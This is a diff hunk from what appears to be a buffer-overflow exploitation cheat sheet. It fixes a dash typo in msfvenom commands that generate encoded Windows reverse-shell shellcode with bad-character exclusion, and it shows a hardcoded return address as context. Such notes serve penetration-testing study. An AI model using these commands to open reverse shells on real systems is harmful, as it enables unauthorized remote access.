@@ -195,7 +195,7 @@ retn = "\xaf\x11\x50\x62"
 1. Generate shellcode with msfvenom (reverse shell)
 
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f c –e x86/shikata_ga_nai -b "<BADCHARS>"
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f c -e x86/shikata_ga_nai -b "<BADCHARS>"
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f c -a x86 -b "<BADCHARS>"
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -b "<BADCHARS>" -f py
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f c -a x86 -e x86/alpha_mixed
